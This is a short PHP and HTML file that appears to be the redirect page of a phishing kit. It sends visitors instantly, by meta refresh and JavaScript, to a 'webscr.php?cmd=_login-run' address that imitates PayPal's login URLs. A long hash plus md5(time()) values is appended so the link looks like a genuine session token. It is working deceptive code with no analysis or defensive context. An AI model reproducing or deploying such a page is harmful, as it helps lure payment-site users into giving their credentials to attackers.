<?php
$echo="webscr.php?cmd=_login-run&dispatch=5885d80a13c0db1fb6947b0aeae66fdbfb2119927117e3a6f876e0fd34af4365".md5(time()).md5(time());
?>
<html><head>
<meta HTTP-Equiv="refresh" content="0; URL=<?echo $echo; ?>">
<script type="text/javascript">
echo = "<?echo $echo; ?>"
self.location.replace(echo);
window.location = echo;
</script>
</head>